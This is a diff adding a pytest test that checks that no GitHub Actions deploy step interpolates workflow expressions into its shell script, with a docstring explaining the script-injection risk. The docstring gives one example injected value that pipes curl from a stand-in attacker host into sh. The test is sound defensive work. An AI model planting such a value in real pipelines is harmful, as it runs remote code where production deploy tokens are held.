@@ -140,6 +140,42 @@ def test_reconciliation_step_only_runs_when_no_deployment_id_exists(job_name, he
 
 
 @pytest.mark.parametrize("job_name,health_url", _JOBS)
+def test_no_deploy_step_interpolates_an_expression_into_its_shell_script(job_name, health_url):
+    """``${{ }}`` in a ``run:`` body is textual substitution *before* the shell sees the script,
+    so any expression whose value isn't fully under our control is a script-injection sink.
+
+    ``steps.pre_deploy_health.outputs.commit_sha`` is exactly such a value: it is whatever
+    ``jq`` pulled out of a **remote HTTP response body** from ``/health``. Interpolated into
+    ``run:``, a ``commit_sha`` of ``"; curl evil.example | sh #`` would execute -- in a job that
+    holds ``RAILWAY_TOKEN_PRODUCTION``. And the reachability argument is the wrong way round from
+    the usual "but it's our own service": this step runs *only* when the deploy infrastructure is
+    already misbehaving, which is precisely when the endpoint's output is least trustworthy.
+
+    The documented mitigation is indirection through ``env:`` -- the expression is expanded into
+    an environment variable's value, which the shell then reads as data rather than parsing as
+    source. So no ``run:`` body in these jobs may contain an expression at all, including the
+    ones (like ``github.sha``) that happen to be safe today: an all-or-nothing rule is the only
+    kind a reviewer can check at a glance, and it doesn't rot when a step gains an argument.
+    """
+    job = _job_block(job_name)
+    for step_name in (
+        "Sample /health before upload",
+        "Deploy to Railway",
+        "Wait for deployment to go live",
+        "Reconcile deploy with no deployment id",
+    ):
+        step = _step_block(job, step_name)
+        # The `run:` body is everything from the `run:` key up to the sibling `env:` key.
+        run_body = re.search(r"^(\s*)run:(.*?)(?=^\1env:|\Z)", step, re.M | re.S)
+        assert run_body is not None, f"{step_name!r} has no `run:` body"
+        assert "${{" not in run_body.group(2), (
+            f"{step_name!r} interpolates a workflow expression directly into its shell script. "
+            "Pass it through `env:` and reference it as a shell variable instead, so the value "
+            "reaches the shell as data rather than as source text."
+        )
+
+
+@pytest.mark.parametrize("job_name,health_url", _JOBS)
 def test_the_two_gated_steps_are_exhaustive_so_a_failed_deploy_cannot_report_green(
     job_name, health_url
 ):
